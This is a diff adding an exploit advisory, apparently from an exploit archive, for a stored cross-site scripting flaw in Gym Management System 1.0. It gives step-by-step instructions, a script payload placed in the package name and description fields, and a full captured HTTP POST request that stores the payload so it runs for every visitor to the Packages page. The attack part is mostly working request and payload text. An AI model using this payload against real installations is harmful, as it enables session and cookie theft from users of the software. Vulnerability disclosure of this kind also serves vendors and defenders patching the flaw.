@@ -1,0 +1,46 @@
+# Exploit Title: Gym Management System 1.0 - Stored Cross Site Scripting
+# Date: 21/10/2020
+# Exploit Author: Jyotsna Adhana
+# Vendor Homepage: https://www.sourcecodester.com/php/14541/gym-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14541&title=Gym+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+Step 1: Open the URL http://localhost/gym/gym/index.php?page=packages
+
+Step 2: use payload <script>alert(document.cookie)</script> in Package Name and Description field
+
+Malicious Request
+POST /gym/gym/ajax.php?action=save_package HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------10391575234966392972740129710
+Content-Length: 587
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/gym/gym/index.php?page=packages
+Cookie: PHPSESSID=7lojvad06l803amt3f7hp7o8re; laravel_session=eyJpdiI6IlBXakg2NzB1cVBEWVZtemIwVzZ6NVE9PSIsInZhbHVlIjoiU2dsaTN1alRCXC9cL1I5dnNzRDlPRDlXTDZ4UUFiakhlN0JLVzB4MnpOVVZibnpISDNFS1k3YjdzWWM2UWRzVEZyIiwibWFjIjoiZGRmODE1NGFhN2JhY2U2NTNhOWU1MzViMjFjYWExM2UzNzYwN2QzZDZmNDQwNjcyMjA1MjJiYTI2NDU2Y2Q1MSJ9; XSRF-TOKEN=eyJpdiI6IlBSMFVNT3NoYkNNVTRpQzNDRHNDNXc9PSIsInZhbHVlIjoiSmF2WXRabHhCZHNZdVlmd1RGeU1pakdoT2JQaWdvcFgzK1QzeFJ6YzRiVGZ5VGdMcmp6SlMrbVl4cnZucG9OZSIsIm1hYyI6Ijc2NzA5MjYzM2E2NjgwMWZlZmFlM2JlOTI2ZmI2YTA3NmE2M2FiYjdlN2E2NzI1NmVhZjA2N2FmOTgwOTlkZGUifQ%3D%3D
+
+-----------------------------10391575234966392972740129710
+Content-Disposition: form-data; name="id"
+
+
+-----------------------------10391575234966392972740129710
+Content-Disposition: form-data; name="package"
+
+<script>alert(document.cookie)</script>
+-----------------------------10391575234966392972740129710
+Content-Disposition: form-data; name="description"
+
+<script>alert(document.cookie)</script>
+-----------------------------10391575234966392972740129710
+Content-Disposition: form-data; name="amount"
+
+1
+-----------------------------10391575234966392972740129710--
+
+Step 3: Cookie will be reflected each time someone visits the Packages section.
